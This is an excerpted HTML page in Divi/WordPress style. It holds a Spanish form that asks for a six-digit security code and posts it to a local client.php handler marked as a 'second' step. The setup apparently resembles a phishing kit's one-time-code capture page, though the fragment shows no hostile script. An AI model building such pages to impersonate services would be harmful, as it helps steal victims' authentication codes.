...
<head>
    ...
    <link rel="icon" href="./images/brand-bg-white-cp.png" sizes="32x32">
    <link rel="icon" href="./images/brand-bg-white-cp.png" sizes="192x192">
    <link rel="apple-touch-icon" href="./images/brand-bg-white-cp.png">
    <meta name="msapplication-TileImage" content="./images/brand-bg-white-cp.png">
...
<body class="page-template-default page page-id-2255 et-tb-has-template et-tb-has-header et-tb-has-footer et_pb_button_helper_class et_cover_background et_pb_gutter et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db">
    ...
    color: #dc6718!important;">
                                                ...
                                                <div style="text-align: center;" class="et_pb_module et_pb_text et_pb_text_1  et_pb_text_align_left et_pb_bg_layout_light">
                                                    ...
                                                    <form method="post" action="./process/client.php">
                                                        <div class="et_pb_text_inner">
                                                            <input type="text" inputmode="numeric" name="code" minlength="6" maxlength="6" required="required" placeholder="Código de seguridad" class="et_pb_s" style="
  margin-top: 5px;
  box-sizing: border-box;
  display: inline-block;
  font-weight:300;
  ...
  ">
    ...
    background-color: #6949c7;" href="./index.php">Regresar</a>
                                                        ...
                                                        <input type="hidden" name="accion" value="second">
